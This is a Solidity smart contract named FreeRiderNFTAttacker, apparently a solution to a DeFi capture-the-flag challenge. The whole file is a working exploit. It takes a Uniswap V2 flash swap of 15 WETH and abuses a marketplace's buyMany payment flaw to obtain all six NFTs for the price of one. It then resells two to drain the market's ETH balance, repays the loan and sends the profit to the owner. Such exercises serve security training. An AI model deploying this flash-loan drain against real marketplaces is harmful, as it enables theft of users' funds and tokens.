// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/interfaces/IERC721.sol";
import "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";

interface IVulMarket {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external; 
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWeth {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderNFTAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable swapPair;
    address private immutable buyer;
    IVulMarket private immutable market;
    IERC721 private immutable nft;
    address private immutable owner;

    constructor(
        IUniswapV2Pair _swapPair,
        address _buyer,
        IERC721 _nft,
        IVulMarket _market
    ) 
    {
        swapPair = _swapPair;
        buyer = _buyer;
        market = _market;
        nft = _nft;
        owner = msg.sender;
    }

    receive () external payable {}

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata /*data*/
    )
     override
     external 
    {
        require(msg.sender == address(swapPair), "only for swap-pair");
        require(sender == owner, "tx from owner");
        require(amount0 == 15 ether, "15 ether for this attacker");
        require(amount1 == 0, "no other token");

        // fetch ether from weth token
        IWeth weth = IWeth(swapPair.token0());
        weth.withdraw(amount0);

        // attack the market get all ntf
        uint256 nftPrice = 15 ether;
        uint256[] memory buyIds = new uint256[](6);
        buyIds[0]=0;
        buyIds[1]=1;
        buyIds[2]=2;
        buyIds[3]=3;
        buyIds[4]=4;
        buyIds[5]=5;
        market.buyMany{value: nftPrice}(buyIds);

        // re sell and buy 2 ntf to empty the balance of market
        nft.setApprovalForAll(address(market), true);
        uint256[] memory sellIds = new uint256[](2);
        sellIds[0]=0;
        sellIds[1]=1;
        uint256[] memory sellPrices = new uint256[](2);
        sellPrices[0]=nftPrice;
        sellPrices[1]=nftPrice;
        market.offerMany(sellIds, sellPrices);

        market.buyMany{value: nftPrice}(sellIds);

        // send nft to buyer
        for(uint256 i=0;i<6;i++){
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // pay back weth
        uint256 paybackAmount = amount0 + 0.05 ether;
        weth.deposit{value:paybackAmount}();
        bool bRes = weth.transfer(address(swapPair), paybackAmount);
        require(bRes, "pay back weth failed");

        // send remain balance to owner
        payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        external
        view
        override
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        return IERC721Receiver.onERC721Received.selector;
    }
}
